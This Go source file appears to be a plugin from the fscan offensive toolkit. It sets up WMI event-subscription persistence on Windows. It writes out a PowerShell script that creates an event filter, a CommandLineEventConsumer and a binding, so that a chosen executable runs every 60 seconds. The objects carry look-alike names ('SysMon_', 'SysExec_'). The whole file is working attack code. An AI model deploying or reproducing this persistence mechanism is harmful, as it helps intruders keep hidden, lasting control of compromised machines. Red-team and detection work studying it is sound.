//go:build (plugin_winwmi || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinWMIPlugin struct {
	plugins.BasePlugin
}

func NewWinWMIPlugin() *WinWMIPlugin {
	return &WinWMIPlugin{
		BasePlugin: plugins.NewBasePlugin("winwmi"),
	}
}

func (p *WinWMIPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("未指定PE文件，使用 -win-pe 参数")}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("PE文件不存在: %s", pePath)}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	filterName := fmt.Sprintf("SysMon_%s", baseName)
	consumerName := fmt.Sprintf("SysExec_%s", baseName)

	ps := fmt.Sprintf(`$ok = 0
try {
  $f = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
  $f.Name = "%s"; $f.EventNameSpace = "root\cimv2"; $f.QueryLanguage = "WQL"
  $f.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  $f.Put() | Out-Null; $ok++; Write-Output "[OK] EventFilter"
} catch { Write-Output "[FAIL] EventFilter: $_" }
try {
  $c = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
  $c.Name = "%s"; $c.ExecutablePath = "%s"; $c.CommandLineTemplate = "%s"
  $c.Put() | Out-Null; $ok++; Write-Output "[OK] Consumer"
} catch { Write-Output "[FAIL] Consumer: $_" }
try {
  $fi = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'"
  $co = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'"
  $b = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
  $b.Filter = $fi.__PATH; $b.Consumer = $co.__PATH
  $b.Put() | Out-Null; $ok++; Write-Output "[OK] Binding"
} catch { Write-Output "[FAIL] Binding: $_" }
Write-Output "TOTAL:$ok"`,
		filterName, consumerName, absPath, absPath, filterName, consumerName)

	out, _ := exec.Command("powershell", "-NoProfile", "-Command", ps).CombinedOutput()
	result := string(out)

	var output strings.Builder
	successCount := 0
	for _, line := range strings.Split(result, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[OK]") || strings.HasPrefix(line, "[FAIL]") {
			output.WriteString(line + "\n")
		}
		if strings.HasPrefix(line, "[OK]") {
			successCount++
		}
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winwmi_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winwmi", func() Plugin {
		return NewWinWMIPlugin()
	})
}
